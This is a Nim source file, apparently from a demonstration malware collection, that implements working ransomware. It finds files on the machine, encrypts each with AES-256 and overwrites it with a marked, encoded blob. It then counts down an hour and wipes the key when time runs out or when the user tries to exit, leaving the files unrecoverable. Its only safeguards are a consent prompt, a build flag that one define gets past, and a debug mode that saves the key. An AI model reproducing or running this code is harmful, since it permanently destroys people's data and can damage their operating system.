# This is just an example to get you started. A typical binary package
# uses this file as the main entry point of the application.
import std/[base64, os]
import nimalicious/[consent, crypto, files]
import nimcrypto

when not defined(debug) and not defined(yesReallyDestroyMyMachine):
  {.error: "You are about to build genuinely destructive malware. Supply -d:yesReallyDestroyMyMachine in order to build.".}

askConsent(
  "gen_ransom",
  @[
    "Files on your machine will be made inaccessible (via encryption)",
    "You face high risk of losing important and valuable data permanently",
    "You face high risk of destroying your operating system"
  ]
)


# Initialize encryption.
var algo: ECB[aes256]
let key = genKey()
algo.init(key)

proc exit() {.noconv.} =
  echo "Clearing encryption key since you tried to exit. Good luck."
  when not defined(debug): algo.clear()
setControlCHook(exit)


let filesx = findFiles()
var i = 0
for file in filesx:
  inc(i)
  echo "Encrypting ", i, " file out of ", len(filesx), " files. (", file, ")"
  var
    contents = autoPadStr(readFile(file), algo.sizeBlock())
    tmp = newString(len(contents))
  algo.encrypt(contents, tmp)
  tmp = "---RANSOMWARE-ENCRYPTED---\n" & encode(tmp)
  writeFile(file, tmp)

echo "Alright! Now! All of your sensitive files should have been encrypted."
echo "In an hour, you will lose the encryption key and forever lose access to all of your files."
echo "And any attempts to exit *will* clear the key."

var time = 60
while time != 0:
  when defined(debug): sleep(100)
  else: sleep(60000)
  dec(time)
  echo time, " minutes remaining."

echo "Alright! Time's up! We're going to exit which will make the key disappear!"

when defined(debug):
  echo "Nah... Im just kidding :P I will save the key in key.txt, have a very lovely day"
  try:
    writeFile("key.txt",key)
  except:
    echo "Um. I couldn't save the key, so here it is: \"", key ,"\""
else:
  echo "Good luck... :-)"
  algo.clear()
  quit(0)
